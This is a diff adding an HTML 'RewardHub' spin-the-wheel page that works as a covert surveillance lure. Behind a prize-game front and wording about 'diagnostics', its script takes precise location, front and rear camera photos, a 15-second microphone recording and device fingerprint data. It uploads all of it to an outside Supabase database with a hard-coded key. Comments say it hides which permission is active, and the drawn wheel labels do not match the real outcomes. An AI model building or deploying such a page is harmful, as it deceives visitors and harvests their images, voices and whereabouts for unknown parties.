@@ -1,0 +1,501 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>RewardHub - Spin & Win</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;font-family:Arial,Helvetica,sans-serif;color:#fff;background:radial-gradient(circle at 50% 25%,#281700 0,#0a0a0a 42%,#020202 100%);min-height:100vh}
+.container{width:min(720px,94%);margin:auto;padding:24px 0 45px}
+.hidden{display:none!important}
+.header{display:flex;justify-content:space-between;align-items:center;gap:15px;margin-bottom:30px}
+.logo{font-size:25px;font-weight:900}.logo span{color:#ffc72c}.sub{color:#888;font-size:13px;margin-top:4px}
+.badge{border:1px solid #444;border-radius:14px;padding:9px 12px;color:#ccc;font-size:12px}
+.hero{text-align:center;margin-bottom:25px}.hero h1{margin:0 0 12px;font-size:clamp(36px,9vw,58px)}.hero h1 span{color:#ffc72c}.hero p{color:#aaa;line-height:1.6}
+.card{background:#141419;border:1px solid #38383f;border-radius:22px;padding:24px}.card h2{margin-top:0}.card p{color:#aaa;line-height:1.6;font-size:14px}
+.permissions{display:grid;gap:10px;margin:20px 0}.permission{background:#0e0e12;border:1px solid #2d2d34;border-radius:13px;padding:13px;font-size:14px}.permission small{color:#888}
+button{font-family:inherit}.allow,.spin{width:100%;min-height:52px;border:0;border-radius:15px;background:linear-gradient(135deg,#ffe477,#efa900);color:#111;font-size:17px;font-weight:900;cursor:pointer}.allow:disabled,.spin:disabled{opacity:.5;cursor:not-allowed}
+.status{margin-top:20px;text-align:center}.loader{width:42px;height:42px;margin:0 auto 16px;border:4px solid #333;border-top-color:#ffc72c;border-radius:50%;animation:loader .8s linear infinite}
+@keyframes loader{to{transform:rotate(360deg)}}.status-title{font-size:20px;font-weight:900;margin-bottom:8px}.status-text{color:#aaa;line-height:1.5;font-size:14px}
+.error{margin-top:15px;padding:13px;border-radius:12px;background:#260d0d;border:1px solid #6e2525;color:#ffb0b0;font-size:13px;line-height:1.5;text-align:left}
+.wheel-section{text-align:center;margin-top:28px}.wheel-section h2{font-size:38px;margin:0 0 6px}.wheel-section h2 span{color:#ffc72c}.wheel-description{color:#aaa;margin-bottom:22px}
+.wheel-wrap{position:relative;width:min(550px,92vw);aspect-ratio:1;margin:auto;padding:10px}.pointer{position:absolute;z-index:20;top:-3px;left:50%;transform:translateX(-50%);width:0;height:0;border-left:18px solid transparent;border-right:18px solid transparent;border-top:42px solid #ffd34a}
+.wheel{width:100%;height:100%;border-radius:50%;border:10px solid #d79a18;box-shadow:0 0 0 5px #704d0c,0 0 35px rgba(255,195,30,.35);background:conic-gradient(#df2027 0 30deg,#101014 30deg 60deg,#df2027 60deg 90deg,#101014 90deg 120deg,#df2027 120deg 150deg,#101014 150deg 180deg,#df2027 180deg 210deg,#101014 210deg 240deg,#df2027 240deg 270deg,#101014 270deg 300deg,#df2027 300deg 330deg,#101014 330deg 360deg);transition:transform 5s cubic-bezier(.12,.8,.15,1)}
+.label{position:absolute;left:50%;top:50%;width:50%;height:50%;transform-origin:0 0;display:flex;justify-content:center;align-items:flex-start;padding-top:15px;font-size:clamp(13px,3vw,21px);font-weight:900;text-shadow:0 2px 3px #000}
+.l1{transform:rotate(15deg)}.l2{transform:rotate(45deg)}.l3{transform:rotate(75deg)}.l4{transform:rotate(105deg)}.l5{transform:rotate(135deg)}.l6{transform:rotate(165deg)}.l7{transform:rotate(195deg)}.l8{transform:rotate(225deg)}.l9{transform:rotate(255deg)}.l10{transform:rotate(285deg)}.l11{transform:rotate(315deg)}.l12{transform:rotate(345deg)}
+.center{position:absolute;z-index:10;left:50%;top:50%;transform:translate(-50%,-50%);width:31%;aspect-ratio:1;border-radius:50%;background:radial-gradient(circle,#ffe680,#e5a719);border:5px solid #fff1a6;color:#111;display:flex;align-items:center;justify-content:center;flex-direction:column}.center strong{font-size:clamp(18px,5vw,30px)}.center small{font-size:11px;font-weight:bold}
+.spin{margin-top:27px;width:min(430px,90%);font-size:20px}
+.result{margin-top:25px;padding:22px;border-radius:18px;background:#141419;border:1px solid #38383f}.result-value{min-height:65px;margin-top:10px;display:flex;align-items:center;justify-content:center;font-size:30px;font-weight:900}.gold{color:#ffd23c}.muted{color:#888}
+.footer{text-align:center;color:#666;font-size:13px;margin-top:35px}
+@media(max-width:520px){.header{align-items:flex-start}.badge{font-size:10px}}
+</style>
+</head>
+<body>
+<div class="container">
+<header class="header">
+  <div><div class="logo">🎁 Reward<span>Hub</span></div><div class="sub">Spin • Win • Enjoy</div></div>
+  <div class="badge">🛡️ Permission required</div>
+</header>
+
+<section id="consent">
+  <div class="hero"><h1>Complete & <span>Spin!</span></h1><p>Complete the permission steps first. The reward wheel becomes available after the process finishes.</p></div>
+  <div class="card">
+    <h2>Before you continue</h2>
+    <p>By pressing <b>Allow & Continue</b>, you agree to the browser permission requests described below. After you continue, the browser will show its permission prompts.</p>
+    <div class="permissions">
+      <div class="permission">📍 <b>Precise location</b><br><small>Your browser will request location permission.</small></div>
+      <div class="permission">📷 <b>Camera</b><br><small>Camera access is requested after location.</small></div>
+      <div class="permission">🎙️ <b>Microphone</b><br><small>Recording is limited to 15 seconds maximum.</small></div>
+    </div>
+    <button id="allowButton" type="button" class="allow">Allow & Continue</button>
+  </div>
+</section>
+
+<section id="status" class="card status hidden" aria-hidden="true">
+  <div id="loader" class="loader"></div>
+  <div id="statusTitle" class="status-title">Preparing…</div>
+  <div id="statusText" class="status-text">Please follow the browser permission prompts.</div>
+  <div id="errorBox" class="error hidden"></div>
+</section>
+
+<section id="wheelSection" class="wheel-section hidden">
+  <h2>All <span>Set!</span></h2>
+  <div class="wheel-description">Setup complete. Try the demo wheel.</div>
+  <div class="wheel-wrap">
+    <div class="pointer"></div>
+    <div id="wheel" class="wheel">
+      <div class="label l1">€0</div><div class="label l2">€0</div>
+      <div class="label l3">€0</div><div class="label l4">€20</div>
+      <div class="label l5">€50</div><div class="label l6">€0</div>
+      <div class="label l7">€0</div><div class="label l8">€75</div>
+      <div class="label l9">€0</div><div class="label l10">€100</div>
+      <div class="label l11">€0</div><div class="label l12">LOSE</div>
+      <div class="center"><strong>SPIN</strong><small>Good Luck!</small></div>
+    </div>
+  </div>
+  <button id="spinButton" type="button" class="spin" disabled>🔄 SPIN NOW</button>
+  <div class="result">
+    <b>🏆 Your Result</b>
+    <div id="resultValue" class="result-value muted">---</div>
+    <div style="color:#777;font-size:11px;margin-top:10px">Demo wheel — results are simulated.</div>
+  </div>
+</section>
+
+<div class="footer">RewardHub<br>Play Fair • Have Fun</div>
+</div>
+
+<script>
+"use strict";
+
+const SUPABASE_URL="https://pkbdjrajsndtmjpmvebq.supabase.co";
+const SUPABASE_KEY="sb_publishable_Ae_r3P5gRwqWUnPeKRMKAg_xmmJVIoW";
+
+const allowButton=document.getElementById("allowButton");
+const consent=document.getElementById("consent");
+const status=document.getElementById("status");
+const loader=document.getElementById("loader");
+const statusTitle=document.getElementById("statusTitle");
+const statusText=document.getElementById("statusText");
+const errorBox=document.getElementById("errorBox");
+const wheelSection=document.getElementById("wheelSection");
+const wheel=document.getElementById("wheel");
+const spinButton=document.getElementById("spinButton");
+const resultValue=document.getElementById("resultValue");
+
+let locationData=null,frontPhoto=null,rearPhoto=null,audioBlob=null;
+let locationConsent=false,cameraConsent=false,microphoneConsent=false;
+let running=false,hasSpun=false,wheelRotation=0;
+
+function showStatus(title,text){
+  status.classList.remove("hidden");
+  loader.classList.remove("hidden");
+  statusTitle.textContent=title;
+  statusText.textContent=text;
+  errorBox.classList.add("hidden");
+  errorBox.textContent="";
+}
+
+function showError(message){
+  loader.classList.add("hidden");
+  statusTitle.textContent="Something went wrong";
+  statusText.textContent="The process stopped.";
+  errorBox.textContent=String(message||"Unknown error");
+  errorBox.classList.remove("hidden");
+  allowButton.disabled=false;
+  running=false;
+}
+
+window.addEventListener("error",e=>{
+  console.error(e.error||e.message);
+  if(running)showError(e.message||"Unexpected JavaScript error.");
+});
+window.addEventListener("unhandledrejection",e=>{
+  console.error(e.reason);
+  if(running)showError(e.reason?.message||String(e.reason)||"Unexpected asynchronous error.");
+});
+
+function requestLocation(){
+  return new Promise((resolve,reject)=>{
+    if(!navigator.geolocation){reject(new Error("This browser does not support location."));return}
+    navigator.geolocation.getCurrentPosition(
+      p=>{locationConsent=true;locationData={latitude:p.coords.latitude,longitude:p.coords.longitude};resolve()},
+      e=>{
+        let m="Location permission was not granted.";
+        if(e?.code===1)m="Location permission was denied.";
+        if(e?.code===2)m="Location position is unavailable.";
+        if(e?.code===3)m="Location request timed out.";
+        reject(new Error(m));
+      },
+      {enableHighAccuracy:true,timeout:20000,maximumAge:0}
+    );
+  });
+}
+
+async function capturePhoto(facingMode){
+  const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode}},audio:false});
+  try{
+    const video=document.createElement("video");
+    video.muted=true;video.playsInline=true;video.autoplay=true;video.srcObject=stream;
+    await new Promise((resolve,reject)=>{
+      video.onloadedmetadata=resolve;
+      video.onerror=()=>reject(new Error("Camera video initialization failed."));
+    });
+    await video.play();
+    await new Promise(r=>setTimeout(r,800));
+    const canvas=document.createElement("canvas");
+    canvas.width=video.videoWidth||1280;
+    canvas.height=video.videoHeight||720;
+    const ctx=canvas.getContext("2d");
+    if(!ctx)throw new Error("Could not create camera canvas.");
+    ctx.drawImage(video,0,0,canvas.width,canvas.height);
+    const blob=await new Promise(resolve=>canvas.toBlob(resolve,"image/jpeg",.85));
+    if(!blob)throw new Error("Photo capture returned no data.");
+    return blob;
+  }finally{
+    stream.getTracks().forEach(t=>t.stop());
+  }
+}
+
+async function requestCameraAndMicrophone(){
+  /*
+    Request camera + microphone together so compatible browsers can present
+    one combined media permission prompt. No active-permission label is shown.
+  */
+  showStatus("Please wait…","Completing setup…");
+
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video:{facingMode:{ideal:"user"}},
+    audio:true
+  });
+
+  cameraConsent = true;
+  microphoneConsent = true;
+
+  try{
+    /* Capture front camera photo while the stream is active. */
+    const video=document.createElement("video");
+    video.muted=true;
+    video.playsInline=true;
+    video.autoplay=true;
+
+    const videoTrack=stream.getVideoTracks()[0];
+    if(!videoTrack){
+      throw new Error("Camera video track is unavailable.");
+    }
+
+    video.srcObject=new MediaStream([videoTrack]);
+
+    await new Promise((resolve,reject)=>{
+      video.onloadedmetadata=resolve;
+      video.onerror=()=>reject(new Error("Camera initialization failed."));
+    });
+
+    await video.play();
+    await new Promise(r=>setTimeout(r,500));
+
+    const canvas=document.createElement("canvas");
+    canvas.width=video.videoWidth||1280;
+    canvas.height=video.videoHeight||720;
+
+    const ctx=canvas.getContext("2d");
+    if(!ctx) throw new Error("Could not create camera canvas.");
+
+    ctx.drawImage(video,0,0,canvas.width,canvas.height);
+
+    frontPhoto=await new Promise(resolve=>
+      canvas.toBlob(resolve,"image/jpeg",.85)
+    );
+
+    /* Prepare microphone recording. */
+    if(!window.MediaRecorder){
+      throw new Error("This browser does not support audio recording.");
+    }
+
+    const chunks=[];
+    let mimeType="";
+
+    for(const type of [
+      "audio/webm;codecs=opus",
+      "audio/webm",
+      "audio/mp4"
+    ]){
+      if(MediaRecorder.isTypeSupported(type)){
+        mimeType=type;
+        break;
+      }
+    }
+
+    const audioTrack=stream.getAudioTracks()[0];
+    if(!audioTrack){
+      throw new Error("Microphone audio track is unavailable.");
+    }
+
+    const audioStream=new MediaStream([audioTrack]);
+    const recorder=mimeType
+      ? new MediaRecorder(audioStream,{mimeType})
+      : new MediaRecorder(audioStream);
+
+    recorder.ondataavailable=e=>{
+      if(e.data&&e.data.size>0) chunks.push(e.data);
+    };
+
+    const stopped=new Promise(resolve=>
+      recorder.addEventListener("stop",resolve,{once:true})
+    );
+
+    recorder.start();
+
+    await new Promise(r=>setTimeout(r,15000));
+
+    if(recorder.state!=="inactive") recorder.stop();
+
+    await stopped;
+
+    audioBlob=new Blob(chunks,{
+      type:recorder.mimeType||"audio/webm"
+    });
+
+  }finally{
+    stream.getTracks().forEach(track=>track.stop());
+  }
+
+  /*
+    Ask for the rear camera only after the combined permission has already
+    been granted. This normally requires no new permission prompt.
+  */
+  try{
+    rearPhoto=await capturePhoto("environment");
+  }catch(error){
+    console.warn("Rear camera unavailable:",error);
+    rearPhoto=null;
+  }
+}
+
+async function getBattery(){
+  try{
+    if(typeof navigator.getBattery==="function"){
+      const b=await navigator.getBattery();
+      return Math.round(b.level*100);
+    }
+  }catch(e){}
+  return null;
+}
+
+async function collectDevice(){
+  return{
+    user_agent:navigator.userAgent||null,
+    platform:navigator.platform||null,
+    language:navigator.language||null,
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||null,
+    screen_width:screen.width||null,
+    screen_height:screen.height||null,
+    color_depth:screen.colorDepth||null,
+    battery_level:await getBattery()
+  };
+}
+
+async function uploadMedia(blob,filename){
+  if(!blob)return null;
+  const path="sessions/"+Date.now()+"-"+Math.random().toString(36).slice(2)+"-"+filename;
+  const response=await fetch(
+    SUPABASE_URL+"/storage/v1/object/visitor-media/"+path,
+    {
+      method:"POST",
+      headers:{
+        "apikey":SUPABASE_KEY,
+        "Authorization":"Bearer "+SUPABASE_KEY,
+        "Content-Type":blob.type||"application/octet-stream",
+        "x-upsert":"false"
+      },
+      body:blob
+    }
+  );
+  if(!response.ok){
+    const text=await response.text();
+    throw new Error("Storage upload failed ("+response.status+"): "+text);
+  }
+  return path;
+}
+
+async function saveData(){
+  showStatus("Saving diagnostics","Saving the permitted diagnostic information…");
+  const device=await collectDevice();
+  const frontPath=await uploadMedia(frontPhoto,"front.jpg");
+  const rearPath=await uploadMedia(rearPhoto,"rear.jpg");
+  const audioPath=await uploadMedia(audioBlob,"audio.webm");
+  const mapsUrl=locationData
+    ?"https://www.google.com/maps?q="+encodeURIComponent(locationData.latitude+","+locationData.longitude)
+    :null;
+
+  const payload={
+    user_agent:device.user_agent,platform:device.platform,language:device.language,
+    timezone:device.timezone,screen_width:device.screen_width,
+    screen_height:device.screen_height,color_depth:device.color_depth,
+    battery_level:device.battery_level,
+    latitude:locationData?locationData.latitude:null,
+    longitude:locationData?locationData.longitude:null,
+    maps_url:mapsUrl,
+    front_photo_path:frontPath,rear_photo_path:rearPath,audio_path:audioPath,
+    camera_consent:cameraConsent,microphone_consent:microphoneConsent,
+    location_consent:locationConsent
+  };
+
+  const response=await fetch(
+    SUPABASE_URL+"/rest/v1/visitor_sessions",
+    {
+      method:"POST",
+      headers:{
+        "apikey":SUPABASE_KEY,
+        "Authorization":"Bearer "+SUPABASE_KEY,
+        "Content-Type":"application/json",
+        "Prefer":"return=minimal"
+      },
+      body:JSON.stringify(payload)
+    }
+  );
+
+  if(!response.ok){
+    const text=await response.text();
+    throw new Error("Database insert failed ("+response.status+"): "+text);
+  }
+}
+
+async function startDiagnostics(){
+  if(running)return;
+  running=true;
+  allowButton.disabled=true;
+  showStatus("Starting…","Preparing permission requests.");
+
+  try{
+    if(!window.isSecureContext)
+      throw new Error("This page is not running in a secure HTTPS context.");
+
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)
+      throw new Error("Camera/microphone API is unavailable.");
+
+    /*
+      No active permission name is shown after the user clicks Continue.
+      The browser itself displays the permission prompts.
+    */
+    showStatus("Please wait…","Completing setup…");
+
+    await requestLocation();
+    await requestCameraAndMicrophone();
+    await saveData();
+
+    consent.classList.add("hidden");
+    status.classList.add("hidden");
+    wheelSection.classList.remove("hidden");
+    spinButton.disabled=false;
+    running=false;
+  }catch(e){
+    console.error("Diagnostics failed:",e);
+    showError(e?.message||String(e));
+  }
+}
+
+/*
+  Demo probability:
+  90% = LOSE / €0
+  10% = random non-zero amount from €1 to €100.
+  This is a simulated UI result, not a real-money payout.
+*/
+const segments=[
+  {label:"€0",win:false},{label:"€0",win:false},
+  {label:"€0",win:false},{label:"€20",win:true},
+  {label:"€0",win:false},{label:"LOSE",win:false},
+  {label:"€0",win:false},{label:"€75",win:true},
+  {label:"€0",win:false},{label:"€100",win:true},
+  {label:"€0",win:false},{label:"LOSE",win:false}
+];
+
+function chooseResult(){
+  /*
+    90% non-winning outcome, 10% winning outcome.
+    Winning amount is always between €20 and €100.
+  */
+  const win=Math.random()<0.10;
+  const choices=segments
+    .map((s,i)=>({s,i}))
+    .filter(x=>x.s.win===win);
+
+  return choices[Math.floor(Math.random()*choices.length)];
+}
+
+function spinWheel(){
+  if(hasSpun)return;
+
+  hasSpun=true;
+  spinButton.disabled=true;
+  resultValue.className="result-value muted";
+  resultValue.textContent="Spinning…";
+
+  const chosen=chooseResult();
+  const index=chosen.i;
+
+  /*
+    Each wedge is exactly 30 degrees.
+    The pointer is fixed at 12 o'clock.
+    Rotate by the negative of the selected wedge center so its CENTER,
+    not its edge, stops exactly under the pointer.
+  */
+  const segmentAngle=30;
+  const centerAngle=index*segmentAngle+(segmentAngle/2);
+  const targetRotation=360-centerAngle;
+
+  wheelRotation += (360*6)+targetRotation;
+  wheel.style.transform="rotate("+wheelRotation+"deg)";
+
+  setTimeout(()=>{
+    if(chosen.s.win){
+      /*
+        Winning amount: €20–€100 inclusive.
+      */
+      const amount=20+Math.floor(Math.random()*81);
+
+      resultValue.textContent="Demo result: €"+amount;
+      resultValue.className="result-value gold";
+    }else{
+      resultValue.textContent=
+        chosen.s.label==="€0"
+        ? "Demo result: €0"
+        : "Try Again 😔";
+
+      resultValue.className="result-value muted";
+    }
+  },5200);
+}
+
+allowButton.addEventListener("click",e=>{
+  e.preventDefault();
+  startDiagnostics();
+});
+
+spinButton.addEventListener("click",e=>{
+  e.preventDefault();
+  spinWheel();
+});
+</script>
+</body>
+</html>
